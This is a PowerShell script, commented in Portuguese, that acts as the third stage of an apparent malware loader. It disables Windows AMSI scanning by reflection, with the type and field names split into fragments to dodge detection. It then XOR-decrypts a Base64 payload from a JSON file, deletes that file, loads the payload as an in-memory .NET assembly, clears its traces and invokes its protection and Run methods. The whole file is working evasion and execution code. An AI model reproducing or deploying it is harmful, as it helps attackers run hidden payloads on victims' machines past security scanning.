# =============================================================================
# STAGE 3 - EXECUTE
# =============================================================================
# Esta etapa carrega e executa o assembly
# Usa AMSI bypass para evitar deteccao
# =============================================================================

param([string]$dataPath)

$ErrorActionPreference = "SilentlyContinue"

#region AMSI Bypass
try {
    $a = [Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils')
    $b = $a.GetField('am'+'siIn'+'itFa'+'iled','NonPublic,Static')
    $b.SetValue($null,$true)
} catch {}
#endregion

$ErrorActionPreference = "Stop"

if (-not (Test-Path $dataPath)) {
    exit 1
}

try {
    # Le dados preparados
    $json = [IO.File]::ReadAllText($dataPath)
    $package = $json | ConvertFrom-Json
    
    # Converte de Base64 de volta para bytes
    $encrypted = [Convert]::FromBase64String($package.Data)
    $key = [Convert]::FromBase64String($package.Key)
    
    # Descriptografa
    $decrypted = New-Object byte[] $encrypted.Length
    for ($i = 0; $i -lt $encrypted.Length; $i++) {
        $decrypted[$i] = $encrypted[$i] -bxor $key[$i % $key.Length]
    }
    
    # Limpa arquivo
    Remove-Item $dataPath -Force -ErrorAction SilentlyContinue
    
    # Carrega via AppDomain (necessário para My.Resources funcionar)
    $assembly = [AppDomain]::CurrentDomain.Load($decrypted)
    
    # Limpa memoria
    [Array]::Clear($encrypted, 0, $encrypted.Length)
    [Array]::Clear($decrypted, 0, $decrypted.Length)
    [Array]::Clear($key, 0, $key.Length)
    [GC]::Collect()
    
    # Ativa RuntimeProtector
    $protector = $assembly.GetType("magica.RuntimeProtector")
    if ($protector -eq $null) {
        $protector = $assembly.GetType("RuntimeProtector")
    }
    if ($protector -ne $null) {
        $start = $protector.GetMethod("StartProtection", 24)
        if ($start -ne $null) {
            $start.Invoke($null, $null)
        }
    }
    
    # Executa
    $main = $assembly.GetType("magica.yucu")
    if ($main -eq $null) {
        foreach ($t in $assembly.GetTypes()) {
            $run = $t.GetMethod("Run", 24)
            if ($run -ne $null) {
                $main = $t
                break
            }
        }
    }
    
    if ($main -ne $null) {
        $run = $main.GetMethod("Run", 24)
        if ($run -ne $null) {
            $run.Invoke($null, $null)
        }
    }
    
} catch {
    exit 1
}
